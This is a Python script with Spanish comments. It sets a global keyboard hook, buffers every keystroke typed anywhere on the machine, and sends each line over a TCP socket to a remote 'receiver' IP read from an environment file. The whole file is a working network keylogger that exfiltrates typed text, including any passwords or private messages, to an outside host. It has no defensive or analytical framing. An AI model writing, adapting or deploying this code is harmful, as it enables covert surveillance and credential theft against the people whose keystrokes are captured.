import socket
import keyboard    # pip install keyboard
import time
import threading
import os
from dotenv import load_dotenv

load_dotenv()

LINUX_IP = os.getenv("LINUX_IP")   # <- Pon la ip(recibidora) en tu env 
PORT = int(os.getenv("PORT"))

# Conexión TCP al servidor
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LINUX_IP, PORT))
print(f"Conectado a {LINUX_IP}:{PORT}")

buffer = []                # lista de caracteres
buffer_lock = threading.Lock()
running = True

def enviar_linea(linea):
    try:
        if not linea:
            return
        msg = linea
        s.sendall(msg.encode('utf-8'))
        print(f"[ENVIADO] {linea!r}", flush=True)
    except Exception as e:
        print("Error enviando:", e)

def on_key(event):
    """
    Callback para cada evento de teclado. Se ejecuta en el hilo del hook.
    Solo procesamos eventos 'down' para evitar duplicados.
    Usamos buffer_lock para evitar condiciones de carrera.
    """
    global running, buffer

    # filtramos: solo nos interesan eventos 'down'
    if event.event_type != 'down':
        return

    name = event.name.lower() if isinstance(event.name, str) else str(event.name)

    # tecla para salir: ESC
    if name == 'esc':
        print("ESC pulsado -> cerrando...")
        running = False
        return

    # Enter -> enviar la línea actual (tomamos y limpiamos la buffer con lock)
    if name in ('enter',):
        with buffer_lock:
            linea = ''.join(buffer)
            buffer.clear()
        if linea:
            enviar_linea(linea)
        return

    # Backspace / delete -> eliminar el último carácter si existe
    if name in ('backspace', 'delete'):
        with buffer_lock:
            if buffer:
                buffer.pop()
        return

    # Espacio
    if name == 'space':
        with buffer_lock:
            buffer.append(' ')
        return

    # Ignorar teclas modificadoras y especiales largas ('shift', 'ctrl', 'alt', 'left', 'up'...)
    # Pero aceptar cualquier nombre que sea un único carácter imprimible
    if len(name) == 1:
        # name puede ser letra, número o símbolo; lo añadimos tal cual
        # si quieres mantener mayúsculas según shift, keyboard.a reporting puede ser 'a' y también
        # se recibe 'shift' events. Para simplificar, enviamos el nombre tal cual.
        with buffer_lock:
            buffer.append(name)
        return

    # si llegamos aquí, ignoramos la tecla (ej: 'f1', 'left', 'page up'...)
    return

def main():
    global running, s
    print("Capturando teclas globales. Escribe donde quieras. Pulsa ENTER para enviar la línea. Pulsa ESC para salir.")
    keyboard.hook(on_key)

    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        keyboard.unhook_all()
        try:
            s.close()
        except:
            pass
        print("Cliente finalizado.")

if __name__ == "__main__":
    main()